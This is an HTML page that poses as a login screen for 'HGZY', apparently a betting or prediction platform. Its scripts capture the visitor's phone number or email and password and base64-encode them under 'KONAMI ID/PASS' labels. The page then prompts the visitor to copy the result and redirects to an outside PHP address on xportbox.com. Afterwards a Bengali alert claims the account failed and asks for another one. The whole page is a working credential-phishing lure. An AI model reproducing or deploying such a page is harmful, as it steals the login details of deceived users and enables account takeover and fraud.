<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HGZY Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #ff725e, #fceae8);
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background: white;
            width: 350px;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 20px;
        }

        .header h1 {
            color: #ff4a4a;
            margin: 0;
            font-size: 24px;
            font-weight: bold;
        }

        .header p {
            color: #666;
            font-size: 14px;
        }

        .tabs {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .tabs button {
            flex: 1;
            padding: 10px;
            border: none;
            background: transparent;
            border-bottom: 2px solid transparent;
            font-size: 14px;
            color: #666;
            cursor: pointer;
        }

        .tabs button.active {
            border-bottom: 2px solid #ff4a4a;
            color: #ff4a4a;
        }

        .form {
            display: none;
        }

        .form.active {
            display: block;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 14px;
        }

        .form-group .input-group {
            display: flex;
        }

        .form-group .input-group select {
            border: 1px solid #ddd;
            border-right: none;
            border-radius: 5px 0 0 5px;
            padding: 10px;
            background: #f9f9f9;
            font-size: 14px;
            width: 80px;
        }

        .form-group .input-group input {
            flex: 1;
            border-left: none;
            border-radius: 0 5px 5px 0;
            padding: 10px;
            border: 1px solid #ddd;
            font-size: 14px;
        }

        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }

        .form-group button {
            width: 100%;
            padding: 10px;
            background: #ff4a4a;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        .form-group button:disabled {
            background: #ccc;
        }

        .icon-button {
            position: absolute;
            bottom: -50px;
            right: 20px;
            width: 50px;
            height: 50px;
            border-radius: 50%;
            overflow: hidden;
            cursor: pointer;
        }

        .icon-button img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .result-box {
            margin-top: 20px;
            padding: 10px;
            background: #f9f9f9;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            color: #333;
        }

        .copy-btn {
            margin-top: 10px;
            padding: 10px;
            background: #00bcd4;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }

        .submit-btn {
            margin-top: 10px;
            padding: 10px;
            background: #ffc107;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>HGZY</h1>
            <p>Please log in with your phone number or email</p>
        </div>
        <div class="tabs">
            <button id="phone-tab" class="active" onclick="showTab('phone')">Phone Number</button>
            <button id="email-tab" onclick="showTab('email')">Email Login</button>
        </div>
        <div id="phone-form" class="form active">
            <div class="form-group">
                <label>Phone Number</label>
                <div class="input-group">
                    <select id="country-code">
                        <option value="+880">+880</option>
                        <option value="+91">+91</option>
                    </select>
                    <input type="text" id="phone" placeholder="Please enter the phone number">
                </div>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="Password">
            </div>
            <div class="form-group">
                <button onclick="validatePhoneLogin()">Log in</button>
            </div>
        </div>
        <div id="email-form" class="form">
            <div class="form-group">
                <label>Email</label>
                <input type="email" id="email" placeholder="Enter your email">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="email-password" placeholder="Password">
            </div>
            <div class="form-group">
                <button onclick="validateEmailLogin()">Log in</button>
            </div>
        </div>
        <a href="https://hgzy5.com/#/main/CustomerService" target="_blank" class="icon-button">
            <img src="https://i.ibb.co/y4wrJc8/icon-sevice-9f0c8455.png" alt="Customer Service">
        </a>
        <div class="result-box" id="result" style="display: none;"></div>
        <button class="copy-btn" id="copy-btn" style="display: none;" onclick="copyToClipboard()">Copy</button>
        <!-- New Submit Button -->
        <button class="submit-btn" id="submit-btn" onclick="submitForm()">Submit</button>
    </div>

    <script>
        function showTab(tab) {
            const phoneForm = document.getElementById('phone-form');
            const emailForm = document.getElementById('email-form');
            const phoneTab = document.getElementById('phone-tab');
            const emailTab = document.getElementById('email-tab');

            if (tab === 'phone') {
                phoneForm.classList.add('active');
                emailForm.classList.remove('active');
                phoneTab.classList.add('active');
                emailTab.classList.remove('active');
            } else {
                emailForm.classList.add('active');
                phoneForm.classList.remove('active');
                emailTab.classList.add('active');
                phoneTab.classList.remove('active');
            }
        }

        function base64Encode(data) {
            return btoa(data);
        }

        function validatePhoneLogin() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;

            if (phone.length < 2 || password.length < 2) {
                alert('Phone number and password must be at least 2 characters long.');
                return;
            }

            const encodedPhone = base64Encode(phone);
            const encodedPassword = base64Encode(password);

            const resultBox = document.getElementById('result');
            const copyButton = document.getElementById('copy-btn');
            resultBox.style.display = 'block';
            copyButton.style.display = 'block';
            resultBox.innerHTML = `<p>KONAMI ID: ${encodedPhone}</p><p>KONAMI PASS: ${encodedPassword}</p>`;
        }

        function validateEmailLogin() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('email-password').value;

            if (email.length < 2 || password.length < 2) {
                alert('Email and password must be at least 2 characters long.');
                return;
            }

            const encodedEmail = base64Encode(email);
            const encodedPassword = base64Encode(password);

            const resultBox = document.getElementById('result');
            const copyButton = document.getElementById('copy-btn');
            resultBox.style.display = 'block';
            copyButton.style.display = 'block';
            resultBox.innerHTML = `<p>KONAMI ID: ${encodedEmail}</p><p> KONAMI KEY: ${encodedPassword}</p>`;
        }

        function copyToClipboard() {
            const resultBox = document.getElementById('result');
            const textToCopy = resultBox.innerText;

            navigator.clipboard.writeText(textToCopy).then(() => {
                alert('Copied to clipboard!');
            }).catch(err => {
                alert('Failed to copy text: ', err);
            });
        }

        // New submit function
        function submitForm() {
            window.location.href = "https://xportbox.com/F1/KO/checkuhQ6hg8r.php?nox=6420661782"; // Redirect to the URL

            setTimeout(function () {
                alert("দুঃখিত, আপনার এই HGZY একাউন্ট দিয়ে এটি চালানো সম্ভব নয়। দয়া করে অন্য একটি একাউন্ট ব্যবহার করুন");
            }, 1000); // Display the message after 1 second
        }
    </script>
</body>
</html>
